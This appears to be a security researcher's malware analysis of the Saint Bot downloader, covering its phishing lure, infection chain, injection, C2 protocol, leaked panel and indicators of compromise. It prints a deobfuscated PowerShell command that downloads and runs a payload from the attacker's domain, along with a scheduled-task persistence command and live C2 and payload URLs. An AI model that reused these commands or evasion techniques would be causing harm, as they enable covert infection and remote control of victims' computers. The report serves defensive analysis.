Contained within the zip file was a PowerShell script\nmasquerading as a link to a Bitcoin wallet. Upon analysis, the obfuscated PowerShell\ndownloader initiated a chain of infection leading to a lesser-known malware called Saint Bot.\nIt turned out that the same malware was also distributed in targeted campaigns against\ngovernment institutions. For example, we found a COVID19-themed campaign targeting\n[Georgia, where the malicious LNK file was accompanied with a malicious document, and a](https://app.any.run/tasks/4950290c-45e0-40a0-9831-2053b486e1ae/)\n[decoy PDF. Both droppers lead to Saint Bot instances [1] [2].](https://app.any.run/tasks/32c9410f-d2fd-4ee1-b2f3-4c20071f9aae/)\n\nSaint Bot is a downloader that appeared quite recently, and slowly is getting momentum. It\n[was seen dropping stealers (i.e. Taurus Stealer, or a simple](https://www.zscaler.com/blogs/security-research/taurus-new-stealer-town) [AutoIt-based stealer) as well as](https://gist.github.com/malwarezone/119bed274bc77b52122fa118f0a72618#file-stealer-au3-L2880)\n[further loaders (example). Yet its design allows to utilize it for distributing any kind of](https://www.virustotal.com/gui/file/388d18b98704bff34ac1cb0a6603e68ba300205ee2f14e4bf482f1012d933231/detection)\nmalware. Although currently it does not appear to be widespread, there is indication that it is\nbeing actively developed. Furthermore, Saint Bot employs a wide variety of techniques\nwhich, although not novel, indicate some level of sophistication considering its relatively new\nappearance.\n\n\n-----\n\nIn this post, we provide a detailed deep-dive of this malware, covering in-depth analysis of\nthe threat from distribution through post-exploitation. In addition to behavioral analysis, we\nwill explore other techniques employed across the stages of infection including obfuscation\nand anti-analysis techniques, process injection, and command and control infrastructure and\ncommunication.\n\n## Distribution\n\nThis analysis will be dedicated to a sample that we found distributed by a phishing e-mail. It\ncomes with a ZIP attachment: _[bitcoin.zip, luring the victim with a chance of getting access to](https://www.virustotal.com/gui/file/63d7b35ca907673634ea66e73d6a38486b0b043f3d511ec2d2209597c7898ae8/detection)_\na Bitcoin wallet.\n\nThe Saint Bot delivery roadmap\nOnce we unzip the content, we are provided with a pair of files: one of them is a .lnk file that\nseemingly leads to a Bitcoin Wallet. It is accompanied with a .txt file, that claims to be a\npassword to this wallet.\n\nThe .txt file says:\n```\nwallet in folder. \n Use Electrum to download & save it on your side \nhttps://download.electrum.org/4.0.9/electrum-4.0.9-setup.exe\n Password is: privatemoney9999999usd\n Thank you\n\n```\nIf we try to preview the .lnk via various tools available on Windows, it seems to lead to\n“C:\\Windows\\System32\\cmd.exe”.\n\n\n-----\n\nBut a closer look inside reveals, that in reality what it contains is a malicious PowerShell\nscript, meant to download the next stage of the malware from the embedded link:\n```\nhttp://68468438438[.]xyz/soft/win230321[.]exe\n\n```\nDeobfuscated script:\n```\n&& C:\\Windows\\System32\\cmd.exe /c poweRshELL.eXE -w 1 $env:SEE_MASK_NOZONECHECKS = 1;\n ImPoRT-modULe bItsTRAnsFer; STArt-bITsTRANSFER -Source \"\n('http://68468438438[.]xyz/soft/win230321.exe')\" -Destination\n$ENV:TEMP\\WindowsUpdate.exe ;\n .('cd') ${eNv:TEMP};\n ./WindowsUpdate.exe!%SystemRoot%\\System32\\SHELL32.dll\n\n```\nThe next stage binary is downloaded into the %TEMP% folder, under the name\nWindowsUpdate.exe, and run from there.\n\n## Behavioral analysis\n\nOnce run, the main sample drops another executable in the %TEMP% directory:\n\n“C:\\Users\\admin\\AppData\\Local\\Temp\\InstallUtil.exe”\n\nwhich then downloads two executables named: def.exe, and putty.exe. It saves them in\n%TEMP%, and tries to execute them with elevated privileges.\n\nIf run, the first sample (def.exe) deploys a batch script disabling Windows Defender. The\nsecond sample (named putty.exe) is the main malicious component.\n\n### Persistence\n\nThe sample named putty.exe installs itself and creates a new directory in “AppData/Local”\nnamed “z_%USERNAME%”. It drops scripts meant to deploy its other components. The\nsame directory also contains a copy of NTDLL, saved under the name “wallpaper.mp4”. This\ncopy will be used by the malicious binary instead of the legitimate one.\n\nThe main sample is copied into the Startup directory under a name impersonating one of the\nlegitimate executables found in the infected system:\n\n\n-----\n\nThe scripts from the “AppData/Local/z_[user]” are used to deploy the main sample. During\nthe first run, the executable injects itself into “EhStorAurhn.exe“. Below we can see the\ninjected implant detected and dropped by HollowsHunter.\n\nOnce the implant was injected, it connects to its Command-and-Control server (C2) and\nproceeds with its main actions. Observing the network traffic we will find the URL of the\nmalware’s C2 queried repeatedly:\n```\nhttp[:]//update-0019992[.]ru/testcp1/gate.php\n\n```\nFollowing this URL we can see the related C2 panel, which looks typical for the Saint Bot:\n\n\n-----\n\n## Internals\n\n### The .NET downloader\n\nThe sample downloaded from the initial .lnk is a next stage downloader, written in .NET and\nobfuscated. It carries another .NET binary in its resources, stored as a bitmap.\n\nThe bitmap carries encrypted content\nDuring the run, it decodes the next stage, which turns out to be a .NET DLL\n[(a98e108588e31f40cdaeab1c04d0a394eb35a2e151f95fbf8a913cba6a7faa63)](https://www.virustotal.com/gui/file/a98e108588e31f40cdaeab1c04d0a394eb35a2e151f95fbf8a913cba6a7faa63/details)\n\n\n-----\n\nDecoded array reveals the PE file\nThe DLL has an internal name zOAI.dll:\n\nThe loader invokes a method from the DLL:\n\n\n-----\n\nInvoking the method inside the DLL: zOAI.CaCl.aXt()\nThe referenced method inside the DLL:\n\nThe content of the DLL is heavily obfuscated at bytecode level, and unreadable for typical\ntools such as dnSpy.\n\n\n-----\n\nThe DLL is run with the help of InstallUtil.exe\n[(e56a7e5d3ab9675555e2897fc3faa2dd9265008a4967a7d54030ab8184d2d38f) – which is a](https://www.virustotal.com/gui/file/e56a7e5d3ab9675555e2897fc3faa2dd9265008a4967a7d54030ab8184d2d38f/details)\nstandard .NET Framework Installation utility – dropped into %TEMP% folder.\n\nThe deployed .NET binary is responsible for downloading and deploying two executables:\nthe one disabling Windows Defender, and another, which is the main payload (in a packed\nform).\n\n### The dropped elements\n\n\n-----\n\nTwo executables are dropped in the %TEMP% directory:\n\n[79dd688046ef9f26ed0cf633cab305f18b46ce7affaa396813a9587ac2918bb0 – named](https://www.virustotal.com/gui/file/79dd688046ef9f26ed0cf633cab305f18b46ce7affaa396813a9587ac2918bb0/detection)\n_def.exe_\n[2d88db4098a72cd9cb58a760e6a019f6e1587b7b03d4f074c979e776ce110403 –](https://www.virustotal.com/gui/file/2d88db4098a72cd9cb58a760e6a019f6e1587b7b03d4f074c979e776ce110403/detection)\nnamed putty.exe\n\n[The first one (def.exe) is just a batch script wrapped by the BatToExe tool. The script:](https://bat-to-exe-converter-x64.en.softonic.com/)\n[Disable Window Defender.bat is meant to prepare the ground for the deployment of the main](https://gist.github.com/hshrzd/e76d78ecd0c649892703430c9ea696fa#file-disable-window-defender-bat)\nbot.\n\n[The other one (putty.exe) is the actual payload, packed by an underground crypter.](https://blog.malwarebytes.com/threat-analysis/2015/12/malware-crypters-the-deceptive-first-layer/)\n\n### The unpacked payload\n\nThe final payload that is carried inside putty.exe can be dumped from the memory with the\n[help of PE-sieve/HollowsHunter. As a result, we get the following unpacked sample:](https://github.com/hasherezade/hollows_hunter)\n[a4b705baac8bb2c0d2bc111eae9735fb8586d6d1dab050f3c89fb12589470969](https://www.virustotal.com/gui/file/a4b705baac8bb2c0d2bc111eae9735fb8586d6d1dab050f3c89fb12589470969/community)\n\nThe compilation timestamp indicates that the payload is pretty fresh – from March of this\nyear.\n\n**Obfuscation**\n\nStrings\n\nLooking inside we can see that the sample is mildly obfuscated. Majority of the strings are\nencoded in a way reminding of a simple substitution cipher.\n\n\n-----\n\nOnly few strings are left in plaintext – including URLs to connect, but also some commands\nprefixed with “de”, i.e. “de:LoadMemory”, “de:regsvr32”, “de:LL”. We can also see the\nhardcoded panel URL: “/testcp1/gate.php”.\n\n[Some (but not all) of the strings can be deobfuscated with the help of the FLOSS tool. We](https://github.com/fireeye/flare-floss)\ncan find out there the name and the version of this malware: “saint_v3” – which indicates the\n“Saint Bot version 3”.\n\n\n-----\n\n[The rest of the strings has been deobfuscated with the help of libPeConv (decoder s source](https://github.com/hasherezade/libPeConv)\n[here). Full list (along with their offsets) is available here.](https://gist.github.com/hshrzd/88edc81349d65e86a2f267874d04cf44)\n\nAPI calls\n\nAPI functions are loaded dynamically, using the names that are decoded just before use:\n\nThey can be deobfuscated with the help of various approaches, i.e. by filling their names\nbasing on the deobfuscated strings. They can be also traced automatically at the execution\ntime, i.e. with the help of [TinyTracer. Sample result:](https://github.com/hasherezade/tiny_tracer)\n\nAPI calls\n\ntagged with TinyTracer\nAnother, simpler (yet more invasive) way of deobfuscation is by rebuilding the Import Table\nwithin the PE to include the dynamically added functions. We can do it by dumping the same\nbinary i.e. with [PE-sieve, with the option of full Import Table reconstruction ( /imp 3). Yet we](https://github.com/hasherezade/pe-sieve/)\nhave to remember that this method may be less accurate in some cases: in contrast to\ntracing, it won’t help to deobfuscate calls that are made i.e. via registers.\n\n\n-----\n\nImports reconstructed\n\n\nwith PE-sieve\n\n### Execution flow\n\nThe sample has 3 alternative execution paths:\n\n1. Install itself\n2. Inject itself into EhStorAurhn.exe\n3. Communicate with the C2 and proceed with the main operations\n\n\n-----\n\nBefore it proceeds with any action, a set of environment checks is performed.\n\n**Defensive checks**\n\nThe sample defends itself against being executed in a controlled (or otherwise forbidden)\nenvironment by performing a number of checks. In case any forbidden condition is detected,\nthe sample drops and deploys del.bat script that is supposed to delete it after the execution\nfinish. After that the sample terminates.\n\n\n-----\n\n[Among the environment checks we can find a locale check. This is very common in case the](https://docs.microsoft.com/en-us/openspecs/office_standards/ms-oe376/6c085406-a698-4e12-9d4d-c3b0ee3dbc4a)\nsample is intended to avoid attacking certain countries.\n\nIn current case 7 locales are blacklisted:\n\n1049 – Russian\n1058 – Ukrainian\n1059 – Belarusian\n1067 – Armenian – Armenia\n1087 – Kazakh\n2072 – Romanian\n2073 – Russian – Moldova\n\nIt also queries the registry searching for keys typical for virtual environments. Queried\nregistry key: “SYSTEM\\CurrentControlSet\\Services\\disk\\Enum” has its values checked\nagainst the list: QEMU, VIRTIO, VMWARE, VBOX, XEN.\n\n\n-----\n\nNote that the checks are gathered all in one function, and thanks to this fact they can be\neasily patched out of the sample to make the analysis easier.\n\n**Mutex and persistence**\n\nThe malware prevents itself from being deployed more than once by creating the mutex\n“saint_v3”.\n\nIf the mutex already exists, the program exits with an error. Otherwise it proceeds with\ninstalling its persistence. It sets a run key in\n“\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” as well as a scheduled task named\n\n\n-----\n\nMaintenance .\n\n‘/create\n\n/sc minute /mo 5 /tn “Maintenance” /tr\n“C:\\Users\\%USERNAME%\\AppData\\Local\\z_%USERNAME%\\%USERNAME%.vbs” /F’\n\n**Process injection**\n\nThe malware injects itself into a newly created process\n“C:\\Windows\\System32\\EhStorAuthn.exe”.\n\nIt writes its payload into the process using ZwWriteVirtualMemory and then executes it with\nthe help of NtQueueApcThread and ZwAlertResumeThread. This is a variant of a well known\ninjection involving adding a start routine into APC Queue of the main thread. It uses low-level\nversions of the dedicated APIs, exported by NTDLL.\n\n\n-----\n\nThe less typical twist in this technique lies in the fact that it does not use the original NTDLL,\nbut its renamed copy – the one that it previously dropped as wallpaper.mp4. This is one of a\nsimple (and pretty naive) tricks that aim to make detection more difficult. It bases on the\nassumption that monitoring tools may have installed hooks inside the original NTDLL . By\nusing a renamed copy of this DLL, the authors tried to prevent the called APIs from being\nwatched by those hooks. In this case the APIs that they tried to hide are the ones related to\ncode injection.\n\n**Communication with the C2**\n\nThe malware comes with addresses of C2 servers hardcoded, as well as the address of the\ngate. The name of the browser agent is also hardcoded, in obfuscated form: “Mozilla/5.0\n_(Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101_\n_YaBrowser/15.10.2454.3865 Safari/537.36“_\n\n\n-----\n\nThe bot keeps querying the C2 and waiting for the commands. Sample beacon:\n```\ntransfer=ZG5ufX1ibnhnblRUVDVNcFFDVFRUdVFDTXk+SSBbIFVGeVpmSUlReUM1RFRUVDJQVFRUT3hiVFRUS\n\n```\nWhich decodes to a list of parameters collected from the infected machine, for example:\n```\ntransfer=-994429369___admin___Windows 7 Professional___IE___x32___1___Intel(R)\nCore(TM) i5-6400 CPU @ 2.70GHz___3___Standard VGA Graphics Adapter___High___24'\n\n```\nThe content sent to/from the C2 is obfuscated by the same algorithm as the internal strings –\nreferenced as decode_wstring – but with a different parameter: -7 (7 for encode, -7 to\ndecode) instead of -6. The received data is first being decoded, and then split by a delimiter\n“\\” into a list of commands.\n\n\n-----\n\nThe list of commands processed is very small. Some of them come with a distinctive prefix\n“de:“.\n\n\n-----\n\nSample response:\n```\nXE1mInNGeUVGNXBNNWM1IlljY3M6cXFDNXBmS01tSVFjZnFaUURmbWZPZlw=\n\n```\nAnd the same response decoded:\n```\n\\de\"programdata\"http://name1d.site/file.exe\\'\n\n```\nWhich means: download the executable from the given link, drop it in “ProgramData”\ndirectory, and execute.\n\nAs the choice of commands shows, the role of this bot is to deliver further payloads to the\ninfected machine.\n\n## The Panel\n\n\n-----\n\nIt is always beneficial to compare what we observed by the analysis of the bot, with the\nserver-side implementation of the same actions. In this case it happens to be possible as we\ngained access to the leaked source of the panel.\n\n### Overview\n\nThe panel of this bot is very small.\n\nThe main view:\n\nThe list of available bots comes with minimalist details about every victim machine, such as\nUsername, IP, OS, Architecture, Privileges with which the bot was deployed, Country, First\nand last timestamp of the communication with the C2, and deployed Actions.\n\nTask panel allows to send commands to the bots:\n\n\n-----\n\nIn this case, the list of commands is very small, as the Saint Bot serves as a downloader for\nother malware. The available tasks are:\n\nDownload&Execute (other payloads)\nUpdate (the Saint Bot)\nUninstall\n\nIn addition we can set several additional options to where the downloaded payload should be\ndropped. Three drop directories are supported: ProgramData, AppData, Temp:\n\n\n-----\n\nThe operator can also set various filters, defining on which of the infected machines the\npayloads will be dropped:\n\nThe list of payloads served by the examined instance point to files uploaded at Discord:\n```\nhttps[:]//cdn.discordapp[.]com/attachments/821809080812437507/822009014418276353/mixi\nnte.exe\nhttps[:]//cdn.discordapp[.]com/attachments/822140450072821791/822146649219661844/z.ex\ne\n\n### The code\n\n```\n\n-----\n\nLike most malware panels, this one is written in PHP, with an SQL database under the hood.\nThe module responsible for sending the tasks to the bot is named: tasks.php. We can find\nthe same commands we observed by analyzing the executable’s code. Three types of tasks:\n\nde – which stands for: Download&Execute\nupdate\nuninstall\n\nWe can also find the available parameters, also correlating with the parameters hardcoded in\nthe previously analyzed executable.\n\nregsvr32 – stands for: download a DLL and run it via regsvr32\nll – stands for: download a DLL and run it via LoadLibrary\nfile – run from a dropped file\nmem – stands for manually load and inject into a process\n\nSome parameters are further translated, which make them a matching set with the\ncommands that were visible in the bot’s code:\n\n\n-----\n\nSo, for the “de” option we get:\n\nde:LL\nde:LoadMemory\nde:regsvr32\n\nCompared with the commands from the previous analysis part:\n\n\n-----\n\nOnce the task is created, it is added to the database, to be polled and executed further:\n\n\n-----\n\n## Evolution\n\nThis bot is fairly new and is evolving slowly and steadily. [The earliest version found by the](https://twitter.com/DanielGallagher/status/1375626221388591107?s=20)\nsimilar artifacts was compiled in January\n(0481edd888e70087115d603ac5c18fe3e15420a28a71bc1ef753d74c27474e9a ). It came\nwith the same set of commands, yet slightly rewritten code.\n\n\n-----\n\nCommand processing function from\n\nthe February edition\nIt used a mutex “saint2021_NewGeneration” suggesting that this bot went through some\nmajor changes since the beginning of this year.\n\n\n-----\n\nThe associated panel suggested that the version using this mutex was numbered as 2.0\n(credits: _[@siri_urz)](https://twitter.com/siri_urz/status/1375861516508000260?s=20)_\n\n## Yet another downloader\n\nSaint Bot is yet another tiny downloader. We suspect it is being sold as a commodity on one\nof the darknet forums, and not linked with any specific actor. It is not as mature as\n[SmokeLoader, but quite new, and currently actively developed. The author seems to have](https://blog.malwarebytes.com/threat-analysis/2016/08/smoke-loader-downloader-with-a-smokescreen-still-alive/)\nsome knowledge of malware design, which is visible by the wide range of techniques used.\nYet, all the deployed techniques are well-known and pretty standard, not showing much\ncreativity so far. Will it become the next wide-spread downloader or disappear from the\nlandscape, pushed away by some other, similar products? We have yet to see.\n\n\n-----\n\n### Indicators of Compromise\n\n**Initial dropper (.lnk)**\n\n[63d7b35ca907673634ea66e73d6a38486b0b043f3d511ec2d2209597c7898ae8](https://www.virustotal.com/gui/file/63d7b35ca907673634ea66e73d6a38486b0b043f3d511ec2d2209597c7898ae8/details)\n\n**Next stage .NET dropper**\n\n[b0b0cb50456a989114468733428ca9ef8096b18bce256634811ddf81f2119274](https://app.any.run/tasks/2c023d0f-57c3-4ddd-98dc-45853d8e31de/)\n\n**.NET downloader**\n\n[a98e108588e31f40cdaeab1c04d0a394eb35a2e151f95fbf8a913cba6a7faa63](https://www.virustotal.com/gui/file/a98e108588e31f40cdaeab1c04d0a394eb35a2e151f95fbf8a913cba6a7faa63/detection)\n\n**Saint Bot (packed)**\n\n[2d88db4098a72cd9cb58a760e6a019f6e1587b7b03d4f074c979e776ce110403](https://www.virustotal.com/gui/file/2d88db4098a72cd9cb58a760e6a019f6e1587b7b03d4f074c979e776ce110403/detection)\n\n**Saint Bot core**\n\n[a4b705baac8bb2c0d2bc111eae9735fb8586d6d1dab050f3c89fb12589470969](https://www.virustotal.com/gui/file/a4b705baac8bb2c0d2bc111eae9735fb8586d6d1dab050f3c89fb12589470969/detection)\n\n**Downloader domain**\n\n68468438438[.]xyz\n\n**C2 servers**\n\nupdate-0019992[.]ru\n\n380222001[.]xyz\n\n\n-----",
